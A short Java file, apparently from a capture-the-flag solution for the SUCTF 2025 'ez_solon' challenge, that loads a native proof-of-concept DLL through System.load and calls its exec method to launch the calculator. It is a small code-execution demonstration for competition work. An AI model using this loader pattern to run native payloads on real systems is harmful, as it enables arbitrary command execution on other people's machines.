package solution.jni;

public class dll_Loader {
    public static void main(String[] args) {
        //加载根源的.dll，即.c文件直接编译的
        System.load("D:/BaiduSyncdisk/ctf-challenges/1diot9/java-challenges/SUCTF/suctf2025/ez_solon/poc.dll");
        Native aNative = new Native();
        aNative.exec("calc");
    }
}
